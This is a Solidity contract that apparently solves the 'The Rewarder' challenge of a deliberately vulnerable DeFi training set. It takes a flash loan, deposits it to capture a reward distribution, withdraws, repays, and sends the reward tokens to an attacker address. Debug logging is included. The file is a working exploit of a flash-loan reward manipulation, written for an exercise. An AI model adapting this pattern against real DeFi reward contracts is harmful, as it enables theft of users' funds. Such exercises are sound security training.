// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

/**
 * @title AttackRewarder
 * @author Luciana Silva
 */
contract AttackRewarder {
    using Address for address;

    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewarderPool;
    address public pool;
    address public attacker;

    constructor(
        address liquidityTokenAddress,
        address _pool,
        address _rewarderPool,
        address _attacker
    ) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        pool = _pool;
        rewarderPool = TheRewarderPool(_rewarderPool);
        attacker = _attacker;
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log(
            "MsgSender in receiveFlashLoan",
            msg.sender,
            "\nAttacker contract balance: ",
            liquidityToken.balanceOf(address(this))
        );

        liquidityToken.approve(address(rewarderPool), amount);

        console.log(
            "Allowance granted to rewarderPool",
            liquidityToken.allowance(address(this), address(rewarderPool))
        );

        rewarderPool.deposit(amount);

        uint256 reward = rewarderPool.distributeRewards();
        console.log("Reward: ", reward);

        rewarderPool.withdraw(amount);

        console.log(
            "Attacker contract balance",
            liquidityToken.balanceOf(address(this))
        );

        console.log(
            "Pool contract balance",
            liquidityToken.balanceOf(msg.sender)
        );

        liquidityToken.transfer(msg.sender, amount);

        console.log(
            "Paid back to FlashLoanerPool: ",
            liquidityToken.balanceOf(msg.sender)
        );
    }

    function attack(uint256 amount, address rewardToken) external {
        console.log("\nmsg.sender inside the function attack: ", msg.sender);
        console.log("\nAttack contract address: ", address(this));

        FlashLoanerPool(pool).flashLoan(amount);

        uint256 reward = RewardToken(rewardToken).balanceOf(address(this));
        RewardToken(rewardToken).transfer(attacker, reward);
    }
}
